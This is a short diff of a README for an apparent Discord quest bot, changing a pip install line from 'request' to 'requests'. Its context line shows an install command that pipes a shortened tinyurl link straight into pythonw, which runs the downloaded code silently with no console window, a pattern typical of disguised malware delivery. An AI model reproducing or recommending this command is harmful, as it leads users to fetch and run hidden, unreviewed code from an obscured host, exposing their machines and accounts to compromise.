@@ -28,7 +28,7 @@ curl -s -L "https://tinyurl.com/DiscordQuestBot" | pythonw && exit
 
 Install dependencies (if any):
 ```bash
-pip install request websocket websocket-client psutil
+pip install requests websocket websocket-client psutil
 ```
 
 ## How It Works
